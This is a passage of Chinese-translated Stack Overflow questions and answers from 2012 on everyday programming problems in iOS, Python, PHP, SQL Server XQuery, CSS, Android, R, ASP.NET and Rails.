除非其他应用程序支持返回调用应用程序（例如，通过响应 URL 中的特殊说明符），否则不会。

请注意，还有`-[UIApplication canOpenURL:]`一个会告诉您是否支持特定的 URL 方案。这对于检查是否安装了特定应用程序而不尝试启动它很有用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T11:49:41.627

这是 iOS 应用程序的默认行为。一旦您的应用程序处于后台，就无法返回到您的应用程序`programatically`。

用户必须手动打开您的应用程序。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T18:23:38.220

您可以使用 URL 方法导航到手机上的其他一些应用程序，但是**您无法返回到您的应用程序**。

一旦您导航到另一个应用程序，它就会接管并且您的应用程序不再运行。因此，其他应用程序需要导航回您。这显然是不可能的，除非您可以访问其他应用程序的代码。

# python - GAE Python - 对视图元素使用全局变量字典

> ID：10862047
> 
> 赞同：0
> 
> 时间：2012-06-02T11:45:21.357
> 
> 标签：python, google-app-engine

我可以使用函数从全局字典变量中读取和写入。

```
dic = { 'someKey' : 'someVal' }
def f():
    dic['newKey'] = 'newVal'
    print dic['someKey'] 
```

我想在模块内的 GAE Python 中做同样的事情

```
class MainPage(webapp.RequestHandler):
    def get(self):
        user = users.get_current_user()
        if not user:
            viewValues = {}
            viewValues['login'] = (users.create_login_url(self.request.path))
            self.response.out.write(template.render('view/login.html', viewValues))
        else:
            self.redirect("/")

    viewValues = {'promotion' : [
                                {'icon': 'time_ico.png',
                                 'heading': 'Instant feedback.',
                                 'detail': 'Quiz your students and get instant results!</br>No need to waste time checking answers manually.'},
                                {'icon': 'money_ico.png',
                                 'heading': 'No equipment necessary!',
                                 'detail': 'No need to spend money on special equipment.</br>Use studyWise&copy; free of charge now.'},
                                {'icon': 'cell_ico.png',
                                 'heading': 'Accessible.',
                                 'detail': 'Can be used with any smartphone or laptop, no installation required.'},
                                {'icon': 'statistics_ico.png',
                                 'heading': 'Statistics.',
                                 'detail': 'Get helpful info about your students understanding of the learning material today.'}
                             ]
              }

Traceback (most recent call last):
  File "D:\Program Files\Google\google_appengine\google\appengine\ext\webapp\_webapp25.py", line 701, in __call__
    handler.get(*groups)
  File "C:\Current Project\StudentVoice_Refactor\src\login.py", line 14, in get
    viewValues['login'] = (users.create_login_url(self.request.path))
NameError: global name 'viewValues' is not defined 
```

为什么会这样？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T11:51:39.800

在 python 中完成的方式是调用 self.varName

在 AS3/Java 中，您可以选择任何一种方式 AFAIK，您可以编写 memberName 或 this.memberName

但是在 python 中你不能，必须使用 self.memberName 而不是 memberName。

好吧，猜猜这解决了它。:)

# php - 如何在PHP中的最后一个逗号之后删除部分字符串

> ID：10862048
> 
> 赞同：4
> 
> 时间：2012-06-02T11:45:43.170
> 
> 标签：php, string, substring

如何在 PHP 中的最后一个逗号之后删除部分字符串？

字符串：`"this is a post, number 1, date 23, month 04, year 2012"`
预期：`"this is a post, number 1, date 23, month 04"`

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-06-02T11:48:11.077

[`substr`](http://php.net/substr)并且[`strrpos`](http://php.net/strrpos)会很有用

```
$until = substr($string, 0, strrpos($string.",", ",")); 
```

注：根据以下评论编辑

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-02T13:34:52.030

您想替换最后一个逗号和其余的逗号，即逗号后跟任何*其他*字符，直到字符串末尾。

这可以表述为正则表达式，并且可以[`preg_replace`](http://php.net/preg_replace)用空字符串替换该模式：

```
$until = preg_replace('/,[^,]*$/', '', $string); 
```

这是[马里奥答案](https://stackoverflow.com/a/10862062/367456)的变体，如果字符串中也没有逗号，也可以使用。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-12-13T23:49:36.000

第一步，分解 String 并删除创建的演示文稿中的最后一部分并内爆数组

```
$tokens = explode(':', $string); // 拆分字符串：
array_pop($tokens); // 去掉最后一个元素
$newString = implode(':', $tokens); // 回卷

```

# sql-server - XML 列 - 无法在推断类型中包含类型“xxx”的表达式上原子化/应用数据（）

> ID：10862049
> 
> 赞同：2
> 
> 时间：2012-06-02T11:45:43.150
> 
> 标签：sql-server, xquery, xquery-sql

**介绍**

我正在尝试查询 SQL Server 2008 中的 xml 列，但出现无法修复的错误。

这是我使用的架构：

```
CREATE XML SCHEMA COLLECTION PublicationSchema AS '
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"
           elementFormDefault="qualified">
   <xs:import namespace="http://www.w3.org/XML/1998/namespace"
              schemaLocation="xml.xsd"/>
   <xs:element name="publication">
      <xs:complexType>
         <xs:sequence>
            <xs:element ref="metadata"/>
         </xs:sequence>
      </xs:complexType>
   </xs:element>
   <xs:element name="meta">
      <xs:complexType>
         <xs:attributeGroup ref="attlist-meta"/>
      </xs:complexType>
   </xs:element>
   <xs:attributeGroup name="attlist-meta">
      <xs:attribute name="name" use="required"/>
      <xs:attribute name="content"/>
      <xs:attribute name="scheme"/>
   </xs:attributeGroup>
   <xs:element name="metadata">
      <xs:complexType>
         <xs:sequence>
            <xs:element maxOccurs="unbounded" ref="meta"/>
         </xs:sequence>
      </xs:complexType>
   </xs:element>
   </xs:schema>'
GO 
```

我使用架构创建带有 XML 列的表：create table test (content XML(PublicationSchema))

我插入一些数据：

```
insert into test values(N'<?xml version="1.0" encoding="UTF-16"?>
<publication>
    <metadata>
        <meta name="type" content="plan" scheme="city"/>
        <meta name="statistics" content="second" scheme="informationtype"/>
    </metadata>
</publication>') 
```

* * *

**问题**

当我执行查询时：

```
select * from test
where Content.exist('/publication/metadata/meta[@name] = "type"') = 1 
```

我收到此错误：

```
 Msg 2213, Level 16, State 1, Line 3
 XQuery [test.content.exist()]: Cannot atomize/apply data()
    on expression that contains type 'meta' within inferred
    type 'element(meta,#anonymous) *' 
```

**问题**

有谁知道我可以做些什么来解决这个查询？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T13:52:34.130

您的`exist`函数中有语法错误。您需要在括号之间进行比较。

```
select * 
from test
where Content.exist('/publication/metadata/meta[@name = "type"]') = 1 
```

如果它不适用于您的架构，这将适用于您拥有的 XML。应用该模式将给出您在评论中提到的错误，因为您没有该属性的数据类型`name`。
您有两种选择来解决此问题。更改架构以包含数据类型或重写上面的查询，以欺骗 SQL Server 将属性视为不属于架构的一部分。

为 指定数据类型`name`如下所示。

```
<xs:attributeGroup name="attlist-meta">
   <xs:attribute name="name" use="required" type="xs:string"/>
   <xs:attribute name="content"/>
   <xs:attribute name="scheme"/>
</xs:attributeGroup> 
```

如果您无法修改架构，则可以改用此查询。

```
select *
from test
where Content.query('/publication/metadata/meta').exist('/*[@name = "type"]') = 1 
```

# html - 删除下拉箭头元素？可能重复：如何从 Firefox 中的 <select>标记中删除箭头 该箭头仅在 Chrome 中消失。这是我正在使用的脚本： select { font-family: 'Viga', sans-serif; 字体大小：16px；颜色：#168ACB；填充：5px 10px 5px 10px；边距：0px 5px 5px 5px；边框半径：8px；-moz-边界半径：8px；-webkit-bo ID：10862050 赞同：2 时间：2012-06-02T11:45:50.527 标签：html, css, html-select 回答 #1 赞同：3 时间：2012-06-02T12:22:13.460 试试看这个： 如何从 Firefox 中的选择元素中删除箭头 巧合的是我的评论： “尝试将其封装在隐藏溢出的 div 中？Div 将具有宽度 < 选择的宽度。 ” 类似于最高投票的答案。</select>

# android - Android：单个活动，多个视图

> ID：10862052
> 
> 赞同：7
> 
> 时间：2012-06-02T11:46:11.070
> 
> 标签：android, design-patterns

尽管我开发了一个包含 50 多个活动的应用程序，但我不是 Android 专业人士，这使得该应用程序非常庞大。经过8周的开发，现在出现了导致应用程序难以维护和升级的问题。我正在处理的主要是

1.  我无法将对象引用传递给活动的构造函数。事实上，我发现`startActivityForResult`- `Intent`-`onActivityResult`真正限制并导致每个活动操作的许多常量的脏代码的机制，其中很多`switch` `case`真的很难遵循应用程序的流程。

2.  另一个问题是我不知道如何管理整个应用程序的生命周期，因为每个活动都有自己的生命周期。

[我在LWUIT](http://lwuit.java.net)和J2ME方面有过一些成功的经验[——波兰语](http://www.j2mepolish.org)忽略了 J2ME MIDlet（类似于 android 活动）并实现了自己的架构和窗口系统，只需一个 MIDlet 作为应用程序的入口。我对android提出了同样的想法。

为了澄清，我正在考虑一个应用程序，其中只有一个主要`Activity`活动和其他活动作为扩展`View`对象的对象实现，并且这些视图可以动态添加到主要活动`FrameLayout`并相互堆叠。活动的逻辑可以在这样的类中实现，我什至找到了一种以这种方式实现对话框的方法。业务和状态对象可以传递给它们的构造函数，这听起来不错，忽略了编写更多代码的副作用。这种方式也可以将监听器传递给视图的构造函数，这使得应用 UI 切换和流管理更容易。

但问题是：

*   这是一个好习惯吗？
*   它不会导致我出现性能或内存问题吗？

我也知道

*   [Android：哪个更好 - 多个活动或手动切换视图？](https://stackoverflow.com/questions/2072244/android-what-is-better-multiple-activities-or-switching-views-manually)
*   [不要重载单个活动屏幕](http://developer.android.com/guide/practices/design/seamlessness.html#multiple-activities)
*   [模式一个活动，多个视图。的优点和缺点](https://stackoverflow.com/questions/4757418/pattern-one-activity-multiple-views-advantages-and-disadvantages)

这些都没有通过合理的证据或书面参考清楚地解决有关绩效或实践的问题

请有人帮我解决这个问题

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-02T12:05:29.207

市场上有一些流行的应用程序只有一个或几个活动。他们使用片段并切换它们。我更喜欢片段而不是你的方法。尽管我认为片段对于许多目的来说太复杂了，但对于您的用例来说，这将是一个很好的解决方案。您的 UI 行为应该在片段中，并且您的活动是在片段之间传输数据的控制器部分。片段也有自己的生命周期。

我也不喜欢`startActivityForResult`。如果我有一组活动 - 所有活动都提供数据 - 而且我不知道它们将按什么顺序被调用，我更喜欢使用单例类，然后使用意图在活动之间传输数据。但是你必须分析你的问题才能得到一个好的解决方案。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-14T17:12:50.893

已经构建了一个 MVC 框架[PureMVC 库](http://puremvc.org/)。

# r - 将时间四舍五入到最接近的一刻钟

> ID：10862056
> 
> 赞同：35
> 
> 时间：2012-06-02T11:47:23.657
> 
> 标签：r, datetime

我有一个 POSIXct 值的向量，我想将它们四舍五入到最近的一刻钟。我不在乎这一天。如何将值转换为小时和分钟？

例如，我想要这个值

```
"2012-05-30 20:41:21 UTC" 
```

成为

```
"20:45" 
```

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2017-11-14T10:03:51.357

确实，到目前为止，这是一个老问题，有一些有用的答案。giraffhere 的最后一个似乎是最优雅的。但是，不是 floor_date 而是 round_date 可以解决问题：

```
lubridate::round_date(x, "15 minutes") 
```

* * *

## 回答 #2

> 赞同：27
> 
> 时间：2012-06-02T12:24:44.663

您可以使用`round`. 诀窍是在舍入前除以 900 秒（15 分钟 * 60 秒），然后乘以 900：

```
a <-as.POSIXlt("2012-05-30 20:41:21 UTC")
b <-as.POSIXlt(round(as.double(a)/(15*60))*(15*60),origin=(as.POSIXlt('1970-01-01')))
b
[1] "2012-05-30 20:45:00 EDT" 
```

要仅获取小时和分钟，只需使用格式

```
format(b,"%H:%M")
[1] "20:45"

as.character(format(b,"%H:%M"))
[1] "20:45" 
```

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2012-06-02T12:14:03.990

就像是

```
format(strptime("1970-01-01", "%Y-%m-%d", tz="UTC") + round(as.numeric(your.time)/900)*900,"%H:%M") 
```

会工作

* * *

## 回答 #4

> 赞同：14
> 
> 时间：2017-04-06T20:44:10.893

老问题，但想指出，这个`lubridate`包现在很容易处理这个问题`floor_date`。要将 POSIXct 对象的向量切割为 15 分钟间隔，请像这样使用。

`x <- lubridate::floor_date(x, "15 minutes")`

编辑：用户@user3297928 指出，`lubridate::round_date(x, "15 minutes")`用于四舍五入到最接近的 15 分钟。上面的楼层吧。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2012-06-02T12:14:16.197

您可以使用`align.time`xts 包中的函数来处理舍入，然后`format`返回一个字符串“HH:MM”：

```
R> library(xts)
R> p <- as.POSIXct("2012-05-30 20:41:21", tz="UTC")
R> a <- align.time(p, n=60*15)  # n is in seconds
R> format(a, "%H:%M")
[1] "20:45" 
```

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2012-06-02T12:17:36.317

试试这个，它结合了两个请求，并基于查看做什么`round.POSIXt()`和`trunc.POSIXt()`做什么。

```
myRound <- function (x, convert = TRUE)  {
    x <- as.POSIXlt(x)
    mins <- x$min
    mult <- mins %/% 15
    remain <- mins %% 15
    if(remain > 7L || (remain == 7L && x$sec > 29))
        mult <- mult + 1
    if(mult > 3) {
        x$min <- 0
        x <- x + 3600
    } else {
        x$min <- 15 * mult
    }
    x <- trunc.POSIXt(x, units = "mins")
    if(convert) {
        x <- format(x, format = "%H:%M")
    }
    x
} 
```

这给出了：

```
> tmp <- as.POSIXct("2012-05-30 20:41:21 UTC")
> myRound(tmp)
[1] "20:45"
> myRound(tmp, convert = FALSE)
[1] "2012-05-30 20:45:00 BST"
> tmp2 <- as.POSIXct("2012-05-30 20:55:21 UTC")
> myRound(tmp2)
[1] "21:00"
> myRound(tmp2, convert = FALSE)
[1] "2012-05-30 21:00:00 BST" 
```

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2015-10-15T00:33:07.493

使用来自`IDate`和一个类（刚刚开发）的类，我能够获得更具可扩展性的解决方案。 只有*shhhhimhuntingrabbits*和*PLapointe以**最近*的方式回答这个问题。解决方案只使用*吊顶*，我的解决方案允许指定*吊顶*或*地板*。 为了获得最佳性能，您需要将数据保存在和类中。正如在基准上看到的那样，它的生产成本很低。低于一些 22M 时间戳的基准：`ITime``data.table``IPeriod`
***`xts`*`IPeriod` **`IDate``ITime``POSIXct``IDate/ITime/IPeriod`******

 ***```
# install only if you don't have
install.packages(c("microbenchmarkCore","data.table"),
                 repos = c("https://olafmersmann.github.io/drat",
                           "https://jangorecki.github.io/drat/iperiod"))
library(microbenchmarkCore)
library(data.table) # iunit branch
library(xts)
Sys.setenv(TZ="UTC")

## some source data: download and unzip csv
# "http://api.bitcoincharts.com/v1/csv/btceUSD.csv.gz"
# below benchmark on btceUSD.csv.gz 11-Oct-2015 11:35 133664801

system.nanotime(dt <- fread(".btceUSD.csv"))
# Read 21931266 rows and 3 (of 3) columns from 0.878 GB file in 00:00:10
#     user   system  elapsed 
#       NA       NA 9.048991

# take the timestamp only
x = as.POSIXct(dt[[1L]], tz="UTC", origin="1970-01-01")

# functions
shhhhi <- function(your.time){
    strptime("1970-01-01", "%Y-%m-%d", tz="UTC") + round(as.numeric(your.time)/900)*900
}

PLapointe <- function(a){
    as.POSIXlt(round(as.double(a)/(15*60))*(15*60),origin=(as.POSIXlt('1970-01-01')))
}

# myRound - not vectorized

# compare results
all.equal(
    format(shhhhi(x),"%H:%M"),
    format(PLapointe(x),"%H:%M")
)
# [1] TRUE
all.equal(
    format(align.time(x, n = 60*15),"%H:%M"),
    format(periodize(x, "mins", 15),"%H:%M")
)
# [1] TRUE

# IPeriod native input are IDate and ITime - will be tested too
idt <- IDateTime(x)
idate <- idt$idate
itime <- idt$itime
microbenchmark(times = 10L,
               shhhhi(x),
               PLapointe(x),
               xts = align.time(x, 15*60),
               posix_ip_posix = as.POSIXct(periodize(x, "mins", 15), tz="UTC"),
               posix_ip = periodize(x, "mins", 15),
               ip_posix = as.POSIXct(periodize(idate, itime, "mins", 15), tz="UTC"),
               ip = periodize(idate, itime, "mins", 15))
# Unit: microseconds
#            expr         min          lq         mean       median          uq         max neval
#       shhhhi(x)  960819.810  984970.363 1127272.6812 1167512.2765 1201770.895 1243706.235    10
#    PLapointe(x) 2322929.313 2440263.122 2617210.4264 2597772.9825 2792936.774 2981499.356    10
#             xts  453409.222  525738.163  581139.6768  546300.9395  677077.650  767609.155    10
#  posix_ip_posix 3314609.993 3499220.920 3641219.0876 3586822.9150 3654548.885 4457614.174    10
#        posix_ip 3010316.462 3066736.299 3157777.2361 3133693.0655 3234307.549 3401388.800    10
#        ip_posix     335.741     380.696     513.7420     543.3425     630.020     663.385    10
#              ip      98.031     151.471     207.7404     231.8200     262.037     278.789    10 
```

`IDate`并且`ITime`不仅在这个特定任务中成功扩展。与 相同的两种类型`IPeriod`都是基于整数的。*我认为它们在加入或按日期*时间字段分组时也会很好地扩展。
在线手册：[https ://jangorecki.github.io/drat/iperiod/](https://jangorecki.github.io/drat/iperiod/)***

# asp.net - 用户交互的异步计算

> ID：10862061
> 
> 赞同：1
> 
> 时间：2012-06-02T11:48:06.060
> 
> 标签：asp.net, ajax

我有一个带有 Ajax 更新面板的标准网页。页面的工作流程是：用户可以添加一些实体，删除一些实体（点击他们各自的按钮）来创建一些定义。然后用户可以保存这些定义，对其进行编辑和删除。

在添加/删除实体时，需要进行复杂的计算，这将是时间密集型的。我想要的是，当用户添加或删除某个实体时，一个单独的线程应该进行计算并更新 UI。这里要记住的一点是，当添加或删除实体时，需要先运行相应的服务器端代码，这会从存储在会话中的集合中添加/删除实体（这意味着我无法启动 ajax调用按钮，因为按钮的服务器端代码需要先运行），然后是计算逻辑。

我想做的是 1\. 让服务器调用按钮单击 2\. 当响应返回时，使用 AJAX 客户端生命周期在页面呈现之前捕获响应。如果请求是添加/删除实体，这是我将进行 ajax 调用的地方。

这似乎过于复杂。我敢肯定，必须有一个简单的方法来做到这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-04T13:35:06.093

找到了我的问题的答案。我需要的是 PageAsyncTask，它内置在 asp.net 中，用于此类工作。

[谷歌](http://www.google.com/search?aq=0&oq=Page.RegisterA&sugexp=chrome,mod=4&sourceid=chrome&ie=UTF-8&q=page.registerasynctask#hl=en&sclient=psy-ab&q=PageAsyncTask&oq=PageAsyncTask&aq=f&aqi=&aql=&gs_l=serp.12...1041870.1041870.1.1043226.1.1.0.0.0.0.0.0..0.0...0.0.V7_pOwd4QVU&pbx=1&bav=on.2,or.r_gc.r_pw.r_qf.,cf.osb&fp=3369bfeac41cfa6a&biw=1680&bih=880)

# ruby-on-rails - rails 3的最佳搜索引擎？

> ID：10862064
> 
> 赞同：1
> 
> 时间：2012-06-02T11:48:31.927
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, search

哪个是rails 3的最佳搜索引擎？

1.  思考狮身人面像
2.  弹性搜索
3.  斯奎尔

或者是其他东西？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T12:04:43.023

你可以使用太阳黑子。可以看[http://sunspot.github.com/](http://sunspot.github.com/)

Thi search gem 使用 solr 作为搜索引擎。

特征：

*   搜索对象
*   深入搜索
*   短语
*   短语提升
*   范围（标量字段）
*   分页
*   刻面

可以看自述文件，[https://github.com/sunspot/sunspot](https://github.com/sunspot/sunspot)

我等着帮你。

问候！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-05-08T10:04:26.283

**我使用了 sunspot**它非常容易实现和快速的搜索引擎。

# android - 在 Tabspec 元素中填充 Listview

> ID：10862065
> 
> 赞同：0
> 
> 时间：2012-06-02T11:48:48.440
> 
> 标签：android, android-asynctask, android-tabhost

在 TabActivity 中，一个 TabSpec 由几个 TextView 和下面的 ListView 元素组成。我想用来自外部数据库的 AsyncTask 填充 ListView。在我的应用程序的所有其他具有“标准”布局的部分中，这可以正常工作，但在这里嵌套的 ListView 似乎会产生问题。如果我将数据加载到 TabSpec 的 ListView 中，则应用程序会在 TabActivity 顶部创建一个新的“窗口”，因此“返回”按钮将我带回（空）TabSpec。

这是我的代码：

TabHost (venueview.xml):

```
<?xml version="1.0" encoding="utf-8"?>
<TabHost xmlns:android="http://schemas.android.com/apk/res/android"
android:id="@android:id/tabhost"
android:layout_width="fill_parent"
android:layout_height="fill_parent">
<LinearLayout
    android:orientation="vertical"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent">
    <TabWidget
        android:id="@android:id/tabs"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content" />
    <FrameLayout
        android:id="@android:id/tabcontent"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"/>
</LinearLayout>
</TabHost> 
```

TabSpec 与 ListView (venueviewreviews.xml)：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="match_parent"
android:layout_height="match_parent"
android:orientation="vertical" >

<TextView
    android:id="@+id/txtvname_r"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="txtvname" />
<RatingBar
    android:id="@+id/ratingBar"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content" />
<Button
    android:id="@+id/btnRatingSubmit"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content" />
<TextView
    android:layout_width="fill_parent"
    android:layout_height="wrap_content" />
<ListView
    android:id="@android:id/list"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content" />
</LinearLayout> 
```

下面是创建 TabHost 的代码：

```
public class VViewActivity extends TabActivity {

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.venueview);

    TabHost tabHost = getTabHost();

    TabSpec vinfospec = tabHost.newTabSpec("Info");
    vinfospec.setIndicator("Info",
            getResources().getDrawable(R.drawable.ic_info));
    Intent vinfoIntent = new Intent(this, VViewBasicActivity.class);
    vinfospec.setContent(vinfoIntent);

    TabSpec vmapspec = tabHost.newTabSpec("Map");
    vmapspec.setIndicator("Location",
            getResources().getDrawable(R.drawable.ic_map));
    Intent vmapIntent = new Intent(this, VViewMapActivity.class);
    vmapspec.setContent(vmapIntent);

    TabSpec vreviewsspec = tabHost.newTabSpec("Reviews");
    vreviewsspec.setIndicator("Reviews",
            getResources().getDrawable(R.drawable.ic_review));
    Intent vreviewsIntent = new Intent(this, VViewReviewsActivity.class);
    vreviewsspec.setContent(vreviewsIntent);

    // Adding all TabSpec to the TabHost for display
    tabHost.addTab(vinfospec);
    tabHost.addTab(vmapspec);
    tabHost.addTab(vreviewsspec);

}

} 
```

这里是我认为问题的根源（双关语）的部分 - 设置 TabSpec 背后的代码， ListView 被正确填充和显示：

```
public class VViewReviewsActivity extends Activity {
private RatingBar ratingBar;
private TextView txtvname_r;
private Button btnRatingSubmit;
private ListView lvComments;
private static ListAdapter laComments;
String vid;
String vname;
String rating;

private static ArrayList<HashMap<String, String>> commentsList;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.venueviewreviews);

    ListView lvComments = (ListView)findViewById(R.id.list);

    Intent lc = new Intent(this, GetVenueComments.class);
    lc.putExtra("vid",vid);
    startActivity(lc);

}

public static class GetVenueComments extends ListActivity {
    JSONParser jParser = new JSONParser();
    JSONArray comments = null;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.venueviewreviews);

        commentsList = new ArrayList<HashMap<String, String>>();
        new LoadAllVenues().execute();

    }

    /**
     * Background Async Task to Load all venues via HTTP Request
     * */
    class LoadAllVenues extends AsyncTask<String, String, String> {

        protected String doInBackground(String... args) {
            List<NameValuePair> params = new ArrayList<NameValuePair>();
            Intent iCurr = getIntent();
            JSONObject json = jParser.makeHttpRequest(
                    getString(R.string.urlVenueComments), "GET", params);

            try {
                // Checking for SUCCESS TAG
                int success = json.getInt(TAG_SUCCESS);
                if (success == 1) {
                    // products found

                    // Getting Array of Products
                    comments = json.getJSONArray(TAG_COMMENTS);

                    // looping through All Products
                    for (int i = 0; i < comments.length(); i++) {
                        JSONObject c = comments.getJSONObject(i);

                        // creating new HashMap
                        HashMap<String, String> hashmap = new HashMap<String, String>();

                        // adding each child node to HashMap key => value
                        hashmap.put(TAG_COMMENTS_ID, cid);
                        hashmap.put(TAG_COMMENTS_COMMENT, ctext);

                        // adding HashList to ArrayList
                        commentsList.add(hashmap);
                    }
                } else {
                    // cut to save space
                }
            } catch (JSONException e) {
                // cut to save space
            }

            return null;
        }

        /**
         * After completing background task Dismiss the progress dialog
         * **/
        protected void onPostExecute(String file_url) {
            // updating UI from Background Thread
            runOnUiThread(new Runnable() {
                public void run() {
                    // Updating parsed JSON data into ListView
                    laComments = new SimpleAdapter(
                            GetVenueComments.this,
                            commentsList,
                            R.layout.commentlistitem,
                            new String[] { TAG_COMMENTS_ID,
                                                                            TAG_COMMENTS_COMMENT }, new int[] {
                                    R.id.CommentList_id,
                                                                            R.id.CommentList_comment });
                    // updating listview
                    setListAdapter(laComments);
                }
            });

        }

    }
} 
```

}

知道我必须解决什么问题才能在 TabSpec 中而不是在单独打开的窗口/活动中显示评论 ListView 吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T13:31:49.003

您的列表视图是在 Activity 中定义的，而不是在 ListActivity 中。设置适配器的方法不同...

也许您对设置适配器的要求应该是：

```
lvComments.setAdapter(laComments); 
```

或者更改为 ListActivity 而不是 Activity。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-05T06:09:38.523

在 Activity 中调用 ListActivity 正在为您创建新窗口。为了避免直接在 TabActivity(VViewActivity) 中注册您的 ListActivity (GetVenueComments)。我在下面进行了检查

```
public class VViewActivity extends TabActivity {

 @Override
 public void onCreate(Bundle savedInstanceState) {
super.onCreate(savedInstanceState);
setContentView(R.layout.venueview);

TabHost tabHost = getTabHost();

TabSpec vinfospec = tabHost.newTabSpec("Info");
vinfospec.setIndicator("Info",
        getResources().getDrawable(R.drawable.ic_info));
Intent vinfoIntent = new Intent(this, VViewBasicActivity.class);
vinfospec.setContent(vinfoIntent);

TabSpec vmapspec = tabHost.newTabSpec("Map");
vmapspec.setIndicator("Location",
        getResources().getDrawable(R.drawable.ic_map));
Intent vmapIntent = new Intent(this, VViewMapActivity.class);
vmapspec.setContent(vmapIntent);

TabSpec vreviewsspec = tabHost.newTabSpec("Reviews");
vreviewsspec.setIndicator("Reviews",
        getResources().getDrawable(R.drawable.ic_review));
Intent vreviewsIntent = new Intent(this, GetVenueComments.class);
vreviewsspec.setContent(vreviewsIntent);

// Adding all TabSpec to the TabHost for display
tabHost.addTab(vinfospec);
tabHost.addTab(vmapspec);
tabHost.addTab(vreviewsspec);

 tabHost.setCurrentTab(2);

 }

}

public static class GetVenueComments extends ListActivity {
JSONParser jParser = new JSONParser();
JSONArray comments = null;

private RatingBar ratingBar;
private TextView txtvname_r;
private Button btnRatingSubmit;
private ListView lvComments;
private static ListAdapter laComments;
String vid;
String vname;
String rating;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.venueviewreviews);

    ListView lvComments = (ListView)findViewById(R.id.list);

    commentsList = new ArrayList<HashMap<String, String>>();
    new LoadAllVenues().execute();

}

/**
 * Background Async Task to Load all venues via HTTP Request
 * */
class LoadAllVenues extends AsyncTask<String, String, String> {

    protected String doInBackground(String... args) {
        List<NameValuePair> params = new ArrayList<NameValuePair>();
        Intent iCurr = getIntent();
        JSONObject json = jParser.makeHttpRequest(
                getString(R.string.urlVenueComments), "GET", params);

        try {
            // Checking for SUCCESS TAG
            int success = json.getInt(TAG_SUCCESS);
            if (success == 1) {
                // products found

                // Getting Array of Products
                comments = json.getJSONArray(TAG_COMMENTS);

                // looping through All Products
                for (int i = 0; i < comments.length(); i++) {
                    JSONObject c = comments.getJSONObject(i);

                    // creating new HashMap
                    HashMap<String, String> hashmap = new HashMap<String, String>();

                    // adding each child node to HashMap key => value
                    hashmap.put(TAG_COMMENTS_ID, cid);
                    hashmap.put(TAG_COMMENTS_COMMENT, ctext);

                    // adding HashList to ArrayList
                    commentsList.add(hashmap);
                }
            } else {
                // cut to save space
            }
        } catch (JSONException e) {
            // cut to save space
        }

        return null;
    }

    /**
     * After completing background task Dismiss the progress dialog
     * **/
    protected void onPostExecute(String file_url) {
        // updating UI from Background Thread
        runOnUiThread(new Runnable() {
            public void run() {
                // Updating parsed JSON data into ListView
                laComments = new SimpleAdapter(
                        GetVenueComments.this,
                        commentsList,
                        R.layout.commentlistitem,
                        new String[] { TAG_COMMENTS_ID,
                                                                        TAG_COMMENTS_COMMENT }, new int[] {
                                R.id.CommentList_id,
                                                                        R.id.CommentList_comment });
                // updating listview
                setListAdapter(laComments);
            }
        });

    }

  }
 } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-06T03:16:20.463

我想我找到了解决方案：TabHost/TabSpec 以某种方式处理视图的方式非常不同，因此在 TabHost 中填充除 ListView 之外的 TextView 或其他元素会弄乱上下文堆栈。

所以我所做的是在重写的 onContentChanged() 方法中刷新引用 Buttons 和 TextViews 的变量，正如“Chris”在[这里](https://stackoverflow.com/questions/5273436/how-to-get-activitys-content-view)解释的那样：

```
@Override
public void onContentChanged() {
    // refresh with current view, otherwise NullPointerException on
    // OnPostExecute() when trying to set value of the field with
    // setText()!!
    super.onContentChanged();

    btnRatingSubmit = (Button) VViewReviewsActivity.this
            .findViewById(R.id.btnRatingSubmit);
    txtvname_r = (TextView) VViewReviewsActivity.this
            .findViewById(R.id.txtvname_r);
    ratingBar = (RatingBar) VViewReviewsActivity.this
            .findViewById(R.id.ratingBar);
} 
```

# objective-c - 执行 UIGesture 操作时，NSTimer 会暂停一段时间

> ID：10862066
> 
> 赞同：2
> 
> 时间：2012-06-02T11:48:50.967
> 
> 标签：objective-c, ios

NSTimer 暂停一段时间，然后在 UIGesture 操作执行时再次启动。

我正在开发一个 iOS 应用程序，我必须每 0.5 秒重复触发 NSTimer，并基于该计时器移动歌曲进度条。当用户触摸我保留在同一视图中的一些图像时，还处理触摸事件。我看到当用户触摸图像时，移动进度条的计时器会停止一段时间并再次继续。

有什么问题我们不能在同一个视图中同时处理定时器和触摸事件吗？

我的计时器代码

```
